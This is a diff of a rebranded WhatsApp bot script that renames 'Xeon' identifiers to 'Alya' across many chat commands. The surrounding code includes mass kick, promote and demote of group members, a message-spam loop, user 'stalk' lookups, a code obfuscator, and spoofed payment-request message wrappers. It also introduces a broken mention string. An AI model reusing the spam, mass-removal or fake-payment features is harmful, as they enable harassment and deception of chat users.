@@ -6552,7 +6143,7 @@ if (!AlyaTheQueen) return AlyaStickOwner()
  if (global.welcome === true) {
  welcome = false;
   }
- for (let remove of xeonkickall) {
+ for (let remove of alyakickall) {
  await AlyaBotInc.groupParticipantsUpdate(m.chat, [(args[0] === "numBut") ? `${remove}@s.whatsapp.net` : remove], "remove");
  await sleep(100);
  }
@@ -6563,7 +6154,7 @@ case 'promoteall': {
  if (!m.isGroup) return AlyaStickGroup()
  if (!isAdmins && !isGroupOwner && !AlyaTheQueen) return AlyaStickAdmin()
  if (!isBotAdmins) return AlyaStickBotAdmin()
-  const xeonpromoteall = (args[0] === 'numBut')
+  const alyapromoteall = (args[0] === 'numBut')
   ? text.replace(`${args[0]} `, '').split('|')
   : (Number(args[0]))
     ? groupMetadata.participants
@@ -6572,7 +6163,7 @@ case 'promoteall': {
     : groupMetadata.participants
       .filter(item => item.id !== botNumber && item.id !== `${ownernumber}@s.whatsapp.net`)
       .map(item => item.id);
- for (let promote of xeonpromoteall) {
+ for (let promote of alyapromoteall) {
  await AlyaBotInc.groupParticipantsUpdate(m.chat, [(args[0] === "numBut") ? `${promote}@s.whatsapp.net` : promote], "promote");
  await sleep(100);
  }
@@ -6583,7 +6174,7 @@ case 'demoteall': {
  if (!m.isGroup) return AlyaStickGroup()
  if (!isAdmins && !isGroupOwner && !AlyaTheQueen) return AlyaStickAdmin()
  if (!isBotAdmins) return AlyaStickBotAdmin()
-  const xeondemoteall = (args[0] === 'numBut')
+  const alyademoteall = (args[0] === 'numBut')
   ? text.replace(`${args[0]} `, '').split('|')
   : (Number(args[0]))
     ? groupMetadata.participants
@@ -6592,7 +6183,7 @@ case 'demoteall': {
     : groupMetadata.participants
       .filter(item => item.id !== botNumber && item.id !== `${ownernumber}@s.whatsapp.net`)
       .map(item => item.id);
- for (let demote of xeondemoteall) {
+ for (let demote of alyademoteall) {
  await AlyaBotInc.groupParticipantsUpdate(m.chat, [(args[0] === "numBut") ? `${demote}@s.whatsapp.net` : demote], "demote");
  await sleep(100);
  }
@@ -7010,7 +6601,7 @@ case 'p': {
                             showAdAttribution: true,
                             title: "Queen alya Status",
                             thumbnailUrl: 'https://i.ibb.co/hLdW1MR/IMG-20240906-154741-714.jpg',
-                            sourceUrl: wagc,
+                            sourceUrl: king,
                             renderLargerThumbnail: true
                         }
                     }
@@ -7019,67 +6610,7 @@ case 'p': {
         }
     }, { quoted: floc });
 }
-	case 'status2': {
-    // Extract the number from the command (e.g., .status2 2349123721026)
-    const number = text.split(' ')[1]; // assuming the message format is .status2 2349123721026
-    if (!number) {
-        return AlyaBotInc.sendMessage(from, { text: "Please provide a valid number." }, { quoted: m });
-    }
-
-    // Form the JID for the number
-    const jid = `${number}@s.whatsapp.net`;
-
-    let status;
-    try {
-        // Fetch status of the number
-        status = await sock.fetchStatus(jid);
-        console.log("status: " + status);
-    } catch (error) {
-        console.log("Failed to fetch status: ", error);
-        return AlyaBotInc.sendMessage(from, { text: "Failed to fetch the status." }, { quoted: m });
-    }
-
-    // Determine if the person has posted a status
-    let statusMessage;
-    if (!status || !status.status) {
-        statusMessage = `The person with number ${number} has not posted any status.`;
-    } else {
-        statusMessage = `👤 *Status of ${number}:* ${status.status}`;
-    }
-
-    // Formatting the response message
-    const respon = `
-📊 *Query Status* 📊
-━━━━━━━━━━━━━━━━━━━━
-${statusMessage}
-━━━━━━━━━━━━━━━━━━━━
-    `.trim();
-
-    // Send the response message with external ad reply
-    AlyaBotInc.relayMessage(m.chat, {
-        requestPaymentMessage: {
-            currencyCodeIso4217: 'INR',
-            amount1000: 999999999,
-            requestFrom: m.sender,
-            noteMessage: {
-                extendedTextMessage: {
-                    text: respon,
-                    contextInfo: {
-                        externalAdReply: {
-                            showAdAttribution: true,
-                            title: "Status Query",
-                            thumbnailUrl: 'https://i.ibb.co/hLdW1MR/IMG-20240906-154741-714.jpg',
-                            sourceUrl: wagc,
-                            renderLargerThumbnail: true
-                        }
-                    }
-                }
-            }
-        }
-    }, { quoted: floc });
-}
-
-break;
+	
 	break
 	case 'repo': case 'repository': {
   try {
@@ -7128,7 +6659,7 @@ break
                             title: botname,
                             body: ownername,
                             thumbnailUrl: 'https://i.imgur.com/QfDM014.jpeg',
-                            sourceUrl: wagc,
+                            sourceUrl: king,
                             mediaType: 1,
                             renderLargerThumbnail: true
                         }
@@ -7166,7 +6697,7 @@ break
                                 title: botname,
                                 body: ownername,
                                 thumbnailUrl: 'https://i.imgur.com/QfDM014.jpeg',
-                                sourceUrl: wagc,
+                                sourceUrl: king,
                                 mediaType: 1,
                                 renderLargerThumbnail: true
                             }
@@ -7182,7 +6713,7 @@ break
                                 title: botname,
                                 body: ownername,
                                 thumbnailUrl: 'https://i.imgur.com/QfDM014.jpeg',
-                                sourceUrl: wagc,
+                                sourceUrl: king,
                                 mediaType: 1,
                                 renderLargerThumbnail: true
                             }
@@ -7203,7 +6734,7 @@ break
                             title: botname,
                             body: ownername,
                             thumbnailUrl: 'https://i.imgur.com/QfDM014.jpeg',
-                            sourceUrl: wagc,
+                            sourceUrl: king,
                             mediaType: 1,
                             renderLargerThumbnail: true
                         }
@@ -7214,7 +6745,7 @@ break
                 break
 case 'sc': case 'script': case 'donate': case 'donate': case 'cekupdate': case 'updatebot': case 'cekbot': case 'sourcecode': {
 let me = m.sender
-let teks = `*「  ${global.botname} Script 」*\n\nYouTube: ${global.websitex}\nGitHub: ${global.botscript}\n\nHi @${me.split('@')[0]} 👋\nDont forget to donate yeah🍜 👇 https://i.imgur.com/DeJiOrr.jpeg`
+let teks = `「 QUEEN ALYA Script 」\n\nChannel: ${king}\nGitHub: ${global.botscript}\n\nHi @${('@')[0]} 👋\nDont forget to donate yeah🍜 👇 https://i.imgur.com/DeJiOrr.jpeg`
 sendAlyaBotIncMessage(from, { 
 text: teks,
 mentions:[sender],
@@ -7229,8 +6760,8 @@ mentionedJid:[sender],
 "containsAutoReply": true,
 "mediaType": 1, 
 "thumbnail": fs.readFileSync("./AlyaMedia/theme/alya.jpg"),
-"mediaUrl": `${wagc}`,
-"sourceUrl": `${wagc}`
+"mediaUrl": `${king}`,
+"sourceUrl": `${king}`
 }
 }
 })
@@ -7247,7 +6778,7 @@ break
                                 title: botname,
                                 body: ownername,
                                 thumbnail: fs.readFileSync('./AlyaMedia/theme/alya.jpg'),
-                                sourceUrl: wagc,
+                                sourceUrl: king,
                                 mediaType: 1,
                                 renderLargerThumbnail: true
                             }
@@ -8079,11 +7610,11 @@ View list of Messages With ${prefix}listmsg`)
 case 'addvn':{
 if (!AlyaTheQueen) return AlyaStickOwner()
 if (args.length < 1) return replygcalya('Whats the audio name?')
-if (VoiceNoteXeon.includes(q)) return replygcalya("The name is already in use")
+if (VoiceNoteAlya.includes(q)) return replygcalya("The name is already in use")
 let delb = await AlyaBotInc.downloadAndSaveMediaMessage(quoted)
-VoiceNoteXeon.push(q)
+VoiceNoteAlya.push(q)
 await fsx.copy(delb, `./AlyaMedia/audio/${q}.mp3`)
-fs.writeFileSync('./AlyaMedia/database/alyavn.json', JSON.stringify(VoiceNoteXeon))
+fs.writeFileSync('./AlyaMedia/database/alyavn.json', JSON.stringify(VoiceNoteAlya))
 fs.unlinkSync(delb)
 replygcalya(`Success Adding Audio\nCheck by typing ${prefix}listvn`)
 }
@@ -8091,20 +7622,20 @@ break
 case 'delvn':{
 if (!AlyaTheQueen) return AlyaStickOwner()
 if (args.length < 1) return replygcalya('Enter the vn name')
-if (!VoiceNoteXeon.includes(q)) return replygcalya("The name does not exist in the database")
-let wanu = VoiceNoteXeon.indexOf(q)
-VoiceNoteXeon.splice(wanu, 1)
-fs.writeFileSync('./AlyaMedia/database/alyavn.json', JSON.stringify(VoiceNoteXeon))
+if (!VoiceNoteAlya.includes(q)) return replygcalya("The name does not exist in the database")
+let wanu = VoiceNoteAlya.indexOf(q)
+VoiceNoteAlya.splice(wanu, 1)
+fs.writeFileSync('./AlyaMedia/database/alyavn.json', JSON.stringify(VoiceNoteAlya))
 fs.unlinkSync(`./AlyaMedia/audio/${q}.mp3`)
 replygcalya(`Success deleting vn ${q}`)
 }
 break
 case 'listvn':{
 let teks = '┌──⭓「 *VN List* 」\n│\n'
-for (let x of VoiceNoteXeon) {
+for (let x of VoiceNoteAlya) {
 teks += `│⭔ ${x}\n`
 }
-teks += `│\n└────────────⭓\n\n*Totally there are : ${VoiceNoteXeon.length}*`
+teks += `│\n└────────────⭓\n\n*Totally there are : ${VoiceNoteAlya.length}*`
 replygcalya(teks)
 }
 break
@@ -8114,11 +7645,11 @@ if (!AlyaTheQueen) return AlyaStickOwner()
 if (args.length < 1) return replygcalya(`What's the zip name?`)
 let teks = `${text}`
 {
-if (ZipXeon.includes(teks)) return replygcalya("This name is already in use")
+if (ZipAlya.includes(teks)) return replygcalya("This name is already in use")
 let delb = await AlyaBotInc.downloadAndSaveMediaMessage(quoted)
-ZipXeon.push(teks)
+ZipAlya.push(teks)
 await fsx.copy(delb, `./AlyaMedia/zip/${teks}.zip`)
-fs.writeFileSync('./AlyaMedia/database/zip.json', JSON.stringify(ZipXeon))
+fs.writeFileSync('./AlyaMedia/database/zip.json', JSON.stringify(ZipAlya))
 fs.unlinkSync(delb)
 replygcalya(`Success Adding zip\nTo check type ${prefix}listzip`)
 }
@@ -8130,10 +7661,10 @@ if (!AlyaTheQueen) return AlyaStickOwner()
 if (args.length < 1) return replygcalya('Enter the text in the zip list')
 let teks = `${text}`
 {
-if (!ZipXeon.includes(teks)) return replygcalya("This name does not exist in the database")
-let wanu = ZipXeon.indexOf(teks)
-ZipXeon.splice(wanu, 1)
-fs.writeFileSync('./AlyaMedia/database/zip.json', JSON.stringify(ZipXeon))
+if (!ZipAlya.includes(teks)) return replygcalya("This name does not exist in the database")
+let wanu = ZipAlya.indexOf(teks)
+ZipAlya.splice(wanu, 1)
+fs.writeFileSync('./AlyaMedia/database/zip.json', JSON.stringify(ZipAlya))
 fs.unlinkSync(`./AlyaMedia/zip/${teks}.zip`)
 replygcalya(`Successfully deleted zip ${teks}`)
 }
@@ -8142,10 +7673,10 @@ break
 case 'listzip': {
 
 let teksooooo = '┌──⭓「 *ZIP LIST* 」\n│\n'
-for (let x of ZipXeon) {
+for (let x of ZipAlya) {
 teksooooo += `│⭔ ${x}\n`
 }
-teksooooo += `│\n└────────────⭓\n\n*Total : ${ZipXeon.length}*`
+teksooooo += `│\n└────────────⭓\n\n*Total : ${ZipAlya.length}*`
 replygcalya(teksooooo)
 }
 break
@@ -8155,11 +7686,11 @@ if (!AlyaTheQueen) return AlyaStickOwner()
 if (args.length < 1) return replygcalya('What is the name of the apk?')
 let teks = `${text}`
 {
-if (ApkXeon.includes(teks)) return replygcalya("This name is already in use")
+if (ApkAlya.includes(teks)) return replygcalya("This name is already in use")
 let delb = await AlyaBotInc.downloadAndSaveMediaMessage(quoted)
 apknye.push(teks)
 await fsx.copy(delb, `./AlyaMedia/apk/${teks}.apk`)
-fs.writeFileSync('./AlyaMedia/database/apk.json', JSON.stringify(ApkXeon))
+fs.writeFileSync('./AlyaMedia/database/apk.json', JSON.stringify(ApkAlya))
 fs.unlinkSync(delb)
 replygcalya(`Successful Adding apk\nTo Check type ${prefix}listapk`)
 }
@@ -8171,10 +7702,10 @@ if (!AlyaTheQueen) return AlyaStickOwner()
 if (args.length < 1) return replygcalya('Name of the apk?')
 let teks = `${text}`
 {
-if (!ApkXeon.includes(teks)) return replygcalya("This name does not exist in the database")
-let wanu = ApkXeon.indexOf(teks)
-ApkXeon.splice(wanu, 1)
-fs.writeFileSync('./AlyaMedia/database/apk.json', JSON.stringify(ApkXeon))
+if (!ApkAlya.includes(teks)) return replygcalya("This name does not exist in the database")
+let wanu = ApkAlya.indexOf(teks)
+ApkAlya.splice(wanu, 1)
+fs.writeFileSync('./AlyaMedia/database/apk.json', JSON.stringify(ApkAlya))
 fs.unlinkSync(`./AlyaMedia/apk/${teks}.apk`)
 replygcalya(`Successfully deleted Apk ${teks}`)
 }
@@ -8183,10 +7714,10 @@ break
 case 'listapk': {
 
 let teksoooooo = '┌──⭓「 *APK LIST* 」\n│\n'
-for (let x of ApkXeon) {
+for (let x of ApkAlya) {
 teksoooooo += `│⭔ ${x}\n`
 }
-teksoooooo += `│\n└────────────⭓\n\n*Total : ${ApkXeon.length}`
+teksoooooo += `│\n└────────────⭓\n\n*Total : ${ApkAlya.length}`
 replygcalya(teksoooooo)
 }
 break
@@ -8392,13 +7923,13 @@ case 'sound158':
 case 'sound159':
 case 'sound160':
 case 'sound161':
-AlyaBotInc_dev = await getBuffer(`https://github.com/DGXeon/Tiktokmusic-API/raw/master/tiktokmusic/${command}.mp3`)
+AlyaBotInc_dev = await getBuffer(`https://github.com/STAR-KING0/Tiktokmusic-API/raw/master/tiktokmusic/${command}.mp3`)
 await AlyaBotInc.sendMessage(m.chat, { audio: AlyaBotInc_dev, mimetype: 'audio/mp4', ptt: true }, { quoted: m })     
 break
 case 'friend':
 case 'searchfriend':{
 await AlyaStickWait()
-let teman = pickRandom(xeonverifieduser)
+let teman = pickRandom(alyachoosen)
 setTimeout(() => {
 }, 1000)
 setTimeout(() => {
@@ -8411,13 +7942,13 @@ AlyaBotInc.sendMessage(from, {text: `Here @${teman.split("@")[0]}`, mentions: [t
 break
 case 'q': case 'quoted': {
 if (!m.quoted) return replygcalya('Reply the Message!!')
-let xeonquotx= await AlyaBotInc.serializeM(await m.getQuotedObj())
-if (!xeonquotx.quoted) return replygcalya('The message you are replying to is not sent by the bot')
-await xeonquotx.quoted.copyNForward(m.chat, true)
+let alyaquotx= await AlyaBotInc.serializeM(await m.getQuotedObj())
+if (!alyaquotx.quoted) return replygcalya('The message you are replying to is not sent by the bot')
+await alyaquotx.quoted.copyNForward(m.chat, true)
 }
 break
 case 'obfus': case 'obfuscate':{
-if (!q) return replygcalya(`Example ${prefix+command} const xeonbot = require('baileys')`)
+if (!q) return replygcalya(`Example ${prefix+command} const alyabot = require('baileys')`)
 let meg = await obfus(q)
 replygcalya(`Success
 ${meg.result}`)
@@ -9092,7 +8623,7 @@ case 'tiktokstalk': {
 }
 break
 case 'xxxigstalk': {
-if (!text) return replygcalya(`Enter Instagram Username\n\nExample: ${prefix + command} unicorn_xeon13`)
+if (!text) return replygcalya(`Enter Instagram Username\n\nExample: ${prefix + command} star_king13`)
     let res = await fg.igStalk(text)
     let te = `
 ┌──「 *STALKING* 
@@ -9108,7 +8639,7 @@ if (!text) return replygcalya(`Enter Instagram Username\n\nExample: ${prefix + c
 }
 break
 case 'ghstalk': case 'githubstalk':{
-if (!q) return replygcalya(`Example ${prefix+command} DGXeon`)
+if (!q) return replygcalya(`Example ${prefix+command} STAR-KING0`)
 await AlyaStickWait()
 let githubstalk = require('./lib/scraper')
 aj = await githubstalk.githubstalk(`${q}`)
@@ -9137,7 +8668,7 @@ Updated At : ${aj.updated_at}` }, { quoted: m } )
 }
 break
 case 'npmstalk':{
-if (!q) return replygcalya(`Example ${prefix+command} xeonapi`)
+if (!q) return replygcalya(`Example ${prefix+command} alyaapi`)
 await AlyaStickWait()
 let npmstalk = require('./lib/scraper')
 eha = await npmstalk.npmstalk(q)
@@ -9218,7 +8749,7 @@ case 'spotify':{
                 title: `PLAYING TO ${name}`,
                 body: botname,
                 thumbnailUrl: coverimage,
-                sourceUrl: websitex,
+                sourceUrl: king,
                 mediaType: 1,
                 renderLargerThumbnail: true
               }
@@ -11677,7 +11208,7 @@ case 'coolcheck':
 case 'waifucheck':
 cantik = body.slice(1)
 const okebnh1 =['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
-const xeonkak = okebnh1[Math.floor(Math.random() * okebnh1.length)]
+const alyakak = okebnh1[Math.floor(Math.random() * okebnh1.length)]
 let msgs = generateWAMessageFromContent(m.chat, {
   viewOnceMessage: {
     message: {
@@ -11687,7 +11218,7 @@ let msgs = generateWAMessageFromContent(m.chat, {
         },
         interactiveMessage: proto.Message.InteractiveMessage.create({
           body: proto.Message.InteractiveMessage.Body.create({
-            text: xeonkak
+            text: alyakak
           }),
           footer: proto.Message.InteractiveMessage.Footer.create({
             text: botname
@@ -12234,7 +11765,7 @@ if (!text) return replygcalya(`What lyrics you looking for?\nExample usage: ${pr
 await AlyaStickWait()
 const { lyrics, lyricsv2 } = require('@bochilteam/scraper')
 const result = await lyricsv2(text).catch(async _ => await lyrics(text))
-const xeonlirik = `
+const alyalirik = `
 *Title :* ${result.title}
 *Author :* ${result.author}
 *Url :* ${result.link}
@@ -12251,7 +11782,7 @@ let msgs = generateWAMessageFromContent(m.chat, {
         },
         interactiveMessage: proto.Message.InteractiveMessage.create({
           body: proto.Message.InteractiveMessage.Body.create({
-            text: xeonlirik
+            text: alyalirik
           }),
           footer: proto.Message.InteractiveMessage.Footer.create({
             text: botname
@@ -12291,7 +11822,7 @@ case 'pick': {
              const participants = m.isGroup ? await groupMetadata.participants : ""
              let member = participants.map((u) => u.id)
              let me = m.sender
-             let xeonshimts = member[Math.floor(Math.random() * member.length)]
+             let alyashimts = member[Math.floor(Math.random() * member.length)]
              let msgs = generateWAMessageFromContent(m.chat, {
   viewOnceMessage: {
     message: {
@@ -12301,7 +11832,7 @@ case 'pick': {
         },
         interactiveMessage: proto.Message.InteractiveMessage.create({
           body: proto.Message.InteractiveMessage.Body.create({
-            text: `The most *${text}* here is *@${xeonshimts.split("@")[0]}*`
+            text: `The most *${text}* here is *@${alyashimts.split("@")[0]}*`
           }),
           footer: proto.Message.InteractiveMessage.Footer.create({
             text: botname
@@ -12317,7 +11848,7 @@ case 'pick': {
             }],
           }), 
           contextInfo: {
-                  mentionedJid: [xeonshimts], 
+                  mentionedJid: [alyashimts], 
                   forwardingScore: 999,
                   isForwarded: true,
                 forwardedNewsletterMessageInfo: {
@@ -12337,14 +11868,14 @@ return await AlyaBotInc.relayMessage(m.chat, msgs.message, {})
      case 'say': case 'tts': case 'gtts':{
 if (!text) return replygcalya('Where is the text?')
             let texttts = text
-            const xeonrl = googleTTS.getAudioUrl(texttts, {
+            const alyarl = googleTTS.getAudioUrl(texttts, {
                 lang: "en",
                 slow: false,
                 host: "https://translate.google.com",
             })
             return AlyaBotInc.sendMessage(m.chat, {
                 audio: {
-                    url: xeonrl,
+                    url: alyarl,
                 },
                 mimetype: 'audio/mp4',
                 ptt: true,
@@ -12560,7 +12091,7 @@ case 'dere':{
     "shout you bastard in front of your mom/papa",
     "change the name to i am idiot for 24 hours",
     "slap urself firmly and send the sound of slap through voice noteðŸ˜‚",
-    "say i love the bot owner xeon through voice note",
+    "say i love the bot owner alya through voice note",
     "send your gf/bf pic here",
     "make any tiktok dance challenge video and put it on status, u can delete it after 5hrs",
     "breakup with your best friend for 5hrs without telling him/her that its a dare",
@@ -12572,7 +12103,7 @@ case 'dere':{
      "put your father name on status for 5hrs",
      "send abusive words in any grup, excepting this grup, and send screenshot proof here"
 ]
-              const xeondare = dare[Math.floor(Math.random() * dare.length)]
+              const alyadare = dare[Math.floor(Math.random() * dare.length)]
               bufferdare = await getBuffer(`https://i.ibb.co/305yt26/bf84f20635dedd5dde31e7e5b6983ae9.jpg`)
               let msgs = generateWAMessageFromContent(m.chat, {
   viewOnceMessage: {
@@ -12583,7 +12114,7 @@ case 'dere':{
         },
         interactiveMessage: proto.Message.InteractiveMessage.create({
           body: proto.Message.InteractiveMessage.Body.create({
-            text: '_You choose DARE_\n'+ xeondare
+            text: '_You choose DARE_\n'+ alyadare
           }),
           footer: proto.Message.InteractiveMessage.Footer.create({
             text: botname
@@ -12688,7 +12219,7 @@ return await AlyaBotInc.relayMessage(m.chat, msgs.message, {})
     "Mention the incident that makes you hurt that you still remember",
     "what achievements have you got this year?",
     "what was your worst habit at school?",
-    "do you love the bot creator, xeon?ðŸ¤£",
+    "do you love the bot creator, alya?ðŸ¤£",
     "have you ever thought of taking revenge from ur teacher?",
     "do you like current prime minister of ur country",
     "you non veg or veg",
@@ -12708,7 +12239,7 @@ return await AlyaBotInc.relayMessage(m.chat, msgs.message, {})
     "Whats the strangest dream you have ever had",
     "do you play pubg, if you then send ur id number"
 ]
-              const xeontruth = truth[Math.floor(Math.random() * truth.length)]
+              const alyatruth = truth[Math.floor(Math.random() * truth.length)]
               buffertruth = await getBuffer(`https://i.ibb.co/305yt26/bf84f20635dedd5dde31e7e5b6983ae9.jpg`)
               let msgs = generateWAMessageFromContent(m.chat, {
   viewOnceMessage: {
@@ -12719,7 +12250,7 @@ return await AlyaBotInc.relayMessage(m.chat, msgs.message, {})
         },
         interactiveMessage: proto.Message.InteractiveMessage.create({
           body: proto.Message.InteractiveMessage.Body.create({
-            text: '_You choose TRUTH_\n'+ xeontruth
+            text: '_You choose TRUTH_\n'+ alyatruth
           }),
           footer: proto.Message.InteractiveMessage.Footer.create({
             text: botname
@@ -17133,7 +16664,7 @@ ppuser = await AlyaBotInc.profilePictureUrl(m.sender, 'image')
 } catch (err) {
 ppuser = 'https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60'
 }
-ppxeon = await getBuffer(ppuser)
+ppalya = await getBuffer(ppuser)
 let msgs = generateWAMessageFromContent(m.chat, {
   viewOnceMessage: {
     message: {
@@ -17150,7 +16681,7 @@ let msgs = generateWAMessageFromContent(m.chat, {
           }),
           header: proto.Message.InteractiveMessage.Header.create({
           hasMediaAttachment: false,
-          ...await prepareWAMessageMedia({ image: ppxeon, mentions: [bet]}, { upload: AlyaBotInc.waUploadToServer })
+          ...await prepareWAMessageMedia({ image: ppalya, mentions: [bet]}, { upload: AlyaBotInc.waUploadToServer })
           }),
           nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
             buttons: [{
@@ -17186,7 +16717,7 @@ case 'awesomecheck':
                     case 'lovelycheck':
                       case 'uglycheck':
 case 'handsomecheck':{
-				if (!text) return replygcalya(`Tag Someone, Example : ${prefix + command} @Xeon`)
+				if (!text) return replygcalya(`Tag Someone, Example : ${prefix + command} @Alya`)
 					const gan = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
 					const teng = gan[Math.floor(Math.random() * gan.length)]
 					let msgs = generateWAMessageFromContent(m.chat, {
@@ -17231,7 +16762,7 @@ return await AlyaBotInc.relayMessage(m.chat, msgs.message, {})
 }
 					break
 case 'beautifulcheck':{
-				if (!text) return replygcalya(`Tag Someone, Example : ${prefix + command} @Xeon`)
+				if (!text) return replygcalya(`Tag Someone, Example : ${prefix + command} @Alya`)
 					const can = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
 					const tik = can[Math.floor(Math.random() * can.length)]
 					let msgs = generateWAMessageFromContent(m.chat, {
@@ -17276,7 +16807,7 @@ return await AlyaBotInc.relayMessage(m.chat, msgs.message, {})
 }
 					break
 					case 'charactercheck':{
-					if (!text) return replygcalya(`Tag Someone, Example : ${prefix + command} @Xeon`)
+					if (!text) return replygcalya(`Tag Someone, Example : ${prefix + command} @Alya`)
 					const alya =['Compassionate','Generous','Grumpy','Forgiving','Obedient','Good','Simp','Kind-Hearted','patient','UwU','top, anyway','Helpful']
 					const taky = alya[Math.floor(Math.random() * alya.length)]
 					let msgs = generateWAMessageFromContent(m.chat, {
@@ -17332,16 +16863,16 @@ break
 case 'telestick': {
 	if (m.isGroup) return AlyaStickPrivate()
 		if (args[0] && args[0].match(/(https:\/\/t.me\/addstickers\/)/gi)) {
-		let xeonresources = await Telesticker(args[0])
-		await replygcalya(`Sending ${xeonresources.length} stickers...`)
-		if (m.isGroup && xeonresources.length > 30) {
+		let alyaresources = await Telesticker(args[0])
+		await replygcalya(`Sending ${alyaresources.length} stickers...`)
+		if (m.isGroup && alyaresources.length > 30) {
 			await replygcalya('Number of stickers more than 30, bot will send it in private chat.')
-			for (let i = 0; i < xeonresources.length; i++) {
-				AlyaBotInc.sendMessage(m.sender, { sticker: { url: xeonresources[i].url }})
+			for (let i = 0; i < alyaresources.length; i++) {
+				AlyaBotInc.sendMessage(m.sender, { sticker: { url: alyaresources[i].url }})
 			}
 		} else {
-			for (let i = 0; i < xeonresources.length; i++) {
-				AlyaBotInc.sendMessage(m.chat, { sticker: { url: xeonresources[i].url }})
+			for (let i = 0; i < alyaresources.length; i++) {
+				AlyaBotInc.sendMessage(m.chat, { sticker: { url: alyaresources[i].url }})
 			}
 		}
 	} else replygcalya(`Where is the telegram sticker link?\nExample. ${prefix + command} https://t.me/addstickers/FriendlyDeath`)
@@ -18356,12 +17887,12 @@ break
 case 'spam':
 				if (!AlyaTheQueen) return AlyaStickOwner()
 					if (!text) return replygcalya(`Use ${prefix +command} text|amount`)
-				xeonarg = text.split("|")
-				if (!xeonarg) return replygcalya(`Use ${prefix+ command} text|amount`)
-				if (Number(xeonarg[1]) >= 50) return replygcalya('Max 50!')
-				if (isNaN(xeonarg[1])) return replygcalya(`must be a number`)
-				for (let i = 0; i < xeonarg[1]; i++){
-					AlyaBotInc.sendMessage(from, {text: xeonarg[0]})
+				alyaarg = text.split("|")
+				if (!alyaarg) return replygcalya(`Use ${prefix+ command} text|amount`)
+				if (Number(alyaarg[1]) >= 50) return replygcalya('Max 50!')
+				if (isNaN(alyaarg[1])) return replygcalya(`must be a number`)
+				for (let i = 0; i < alyaarg[1]; i++){
+					AlyaBotInc.sendMessage(from, {text: alyaarg[0]})
 				}
 				break
 case 'simisimi': case 'simi':
@@ -19046,56 +18577,89 @@ await AlyaBotInc.relayMessage(m.chat, msgs.message, {})
 }
     break
         case 'animate': {
-	if (!text) return replygcalya(`*• Example:* ${prefix + command} a cat chasing mouse`);   
-        try {
-let gpt = await (await fetch(`https://itzpire.com/ai/animate-diff?prompt=${text}`)).json()
-const response = await axios.get(gpt.data.image_urls, { responseType: 'arraybuffer' })
-const buffer = Buffer.from(response.data, "utf-8")
-var fetchedgif = await GIFBufferToVideoBuffer(buffer)
-let msgs = generateWAMessageFromContent(m.chat, {
-  viewOnceMessage: {
-    message: {
-        "messageContextInfo": {
-          "deviceListMetadata": {},
-          "deviceListMetadataVersion": 2
-        },
-        interactiveMessage: proto.Message.InteractiveMessage.create({
-          body: proto.Message.InteractiveMessage.Body.create({
-            text: `> Animation AI\n\n_*Here is the result of: ${text}*_`
-          }),
-          footer: proto.Message.InteractiveMessage.Footer.create({
-            text: botname
-          }),
-          header: proto.Message.InteractiveMessage.Header.create({
-          hasMediaAttachment: false,
-          ...await prepareWAMessageMedia({ video: fetchedgif }, { upload: AlyaBotInc.waUploadToServer })  
-          }),
-          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
-            buttons: [{
-            "name": "quick_reply",
-              "buttonParamsJson": `{\"display_text\":\"Nice 👀\",\"id\":\"\"}`
-            }],
-          }),
-          contextInfo: {
-                  mentionedJid: [m.sender], 
-                  forwardingScore: 999,
-                  isForwarded: true,
-                forwardedNewsletterMessageInfo: {
-                  newsletterJid: 'https://whatsapp.com/channel/0029VarnzwcGJP8HhlyFsO09',
-                  newsletterName: ownername,
-                  serverMessageId: 143
+    if (!text) return replygcalya(`*• Example:* ${prefix + command} a cat chasing mouse`);
+
+    try {
+        // Construct the API URL with the provided query
+        const apiUrl = `https://itzpire.com/ai/animediff2?prompt=${encodeURIComponent(text)}`;
+
+        // Fetch the response from the API
+        const response = await fetch(apiUrl);
+
+        // Check if the response is not OK
+        if (!response.ok) {
+            if (response.status === 500) {
+                return replygcalya("*_Server Error (500): Unable to generate image, please try again later._*");
+            } else {
+                return replygcalya(`*_Error: ${response.status} ${response.statusText}_*`);
+            }
+        }
+
+        // Parse the JSON response
+        const data = await response.json();
+
+        // Check if the status in the response data is not "success"
+        if (data.status !== "success") {
+            return replygcalya("*_An error occurred while fetching the image._*");
+        }
+
+        // Extract the photo URL from the response data
+        const photoUrl = data.result;
+
+        // Fetch the image from the URL
+        const imgResponse = await fetch(photoUrl);
+        const buffer = await imgResponse.arrayBuffer();
+
+        // Prepare and send the image back to the user
+        let media = await prepareWAMessageMedia({ image: Buffer.from(buffer) }, { upload: AlyaBotInc.waUploadToServer });
+
+        let msgs = generateWAMessageFromContent(m.chat, {
+            viewOnceMessage: {
+                message: {
+                    "messageContextInfo": {
+                        "deviceListMetadata": {},
+                        "deviceListMetadataVersion": 2
+                    },
+                    interactiveMessage: proto.Message.InteractiveMessage.create({
+                        body: proto.Message.InteractiveMessage.Body.create({
+                            text: `> Animation AI\n\n_*Here is the result of: ${text}*_`
+                        }),
+                        footer: proto.Message.InteractiveMessage.Footer.create({
+                            text: botname
+                        }),
+                        header: proto.Message.InteractiveMessage.Header.create({
+                            hasMediaAttachment: true,
+                            ...media
+                        }),
+                        nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
+                            buttons: [{
+                                "name": "quick_reply",
